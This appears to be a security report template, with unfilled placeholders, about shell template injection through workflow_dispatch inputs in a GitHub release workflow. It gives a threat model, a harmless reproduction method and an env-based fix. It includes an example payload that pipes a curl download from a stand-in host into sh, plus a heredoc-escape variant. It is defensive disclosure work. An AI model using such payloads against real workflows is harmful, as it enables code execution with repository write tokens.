`workflow_dispatch` inputs are interpolated straight into `run:` scripts, so a release description is executed as shell

### Summary

`release.yml` builds shell command lines by textual substitution of `${{ … inputs.* }}`:

__SITES__

`${{ }}` is expanded by the runner **before** the shell parses the line, so the value is not an argument — it is script text. A `description` of

```
$(curl -s https://example.invalid/x | sh)
```

is a command substitution the shell then runs, in a job that holds a `contents: write` token.

Which input reaches a site decides how live it is. `description` is declared `type: string`, which GitHub constrains in no way. `bump_type` is a `choice`, and GitHub does validate a choice against its `options` — the API answers `422 Provided value 'definitely-not-an-option' for input 'release_mode' not in the list of allowed values` and creates no run, which we measured against our own `release.yml`. So a site fed by `description` is live, and a site fed only by `bump_type` is defence in depth. Both are the same one-line fix.

### Threat model, stated plainly

Dispatching a workflow requires write access, so this is not an anonymous-attacker bug. What it does is turn "may trigger a release" into "may run arbitrary code in a job holding `contents: write` and a `GITHUB_TOKEN`" — for a human with write access, for a bot or app with `actions: write`, and for any token that leaks. It also means the release path cannot be reviewed as data-only, which is the property a release workflow most wants to have.

This is [zizmor](https://docs.zizmor.sh/audits/#template-injection)'s `template-injection` audit, and running zizmor over `.github/` reports these sites.

### Reproduction

The expansion is what matters, so the fixture performs it exactly as the runner does: substitute the input's text into the **whole** `run:` block, dedented as YAML dedents it, and hand that to `bash`, with stub tools on `PATH` so nothing real runs and a payload that proves execution by writing a file rather than by fetching anything. `experiments/issue-123/repro-dispatch-description-injection.sh` (attached below) does that for every `run:` block of `release.yml` that interpolates a dispatch input, with two payloads:

- `cmdsub` — `$(printf INJECTED >> "$proof")`, which reaches an interpolation sitting where the shell performs expansion;
- `heredoc` — a newline, a line reading `EOF`, then the same `$( )`, which is what it takes to escape a **quoted** heredoc (`cat > f << 'EOF'`), inside which the shell expands nothing.

Substituting into whole blocks rather than into single lines is deliberate, and it corrected a false positive in our own first pass: a line lifted out of a quoted heredoc looks like an ordinary command line and reports as injectable when it is not.

Measured against `__REPO__` at `__SHA__`:

```
__REPRO_OUTPUT__
```

Every `REPRODUCED` line is a site where the payload executed inside the step's shell.

### Workaround

Nothing at the repository level: an operator can only avoid typing a description. Until the fix lands, treat the dispatch form as privileged.

### Suggested fix

Pass the value through the environment, and let the shell read it as data. An `env:` value is placed in the process environment, not into the script text, so the shell expands it after parsing:

```diff
__FIX_DIFF__
```

Four things worth doing at the same time:

- **Quote the expansion.** `--bump-type $BUMP_TYPE` unquoted still splits on whitespace and globs; it is no longer *execution*, but it is still not the value.
- **Do the same for every site**, including the ones whose input is a `choice`. A `choice` is validated today; the validation is not part of this workflow's own contract, and a later edit that turns the input into a `string` reintroduces the hole silently.
- **Add the audit to CI**, so the next site is caught when it is written:

  ```yaml
  - name: Audit workflows
    uses: zizmorcore/zizmor-action@<pinned-sha>
    with:
      advanced-security: false
      persona: regular
  ```

  We run zizmor over `.github/` — workflows *and* composite actions, which is worth pointing out: scanning only `.github/workflows` leaves `action.yml` files unread by any linter, and that is where we found our own `template-injection`.

- **Or assert the policy offline.** The `csharp` template already ships one: `scripts/workflow-injection-policy.test.mjs` walks every `run:` block of every workflow and fails on any expression matching its `UNTRUSTED_CONTEXTS` list. Porting it costs no network and no action, and it is worth adding two patterns the shipped list does not have — `/github\.event\.inputs\.\w+/` and `/\binputs\.\w+/` — which are exactly the sites above.

__EXTRA__

### Relation to earlier work

Found while auditing every CI/CD false positive and false negative in `link-foundation/box` ([box#123](https://github.com/link-foundation/box/issues/123)), which compares this template's full workflow and script tree against ours, file by file.

The `rust` template already does the right thing and is worth copying verbatim — `release.yml:1163-1167` reads both inputs through `env:` and the script line references `"$BUMP_TYPE"` and `"$DESCRIPTION"`. The js, python and php templates interpolate no dispatch input into any `run:` script at all.

__PRIOR__
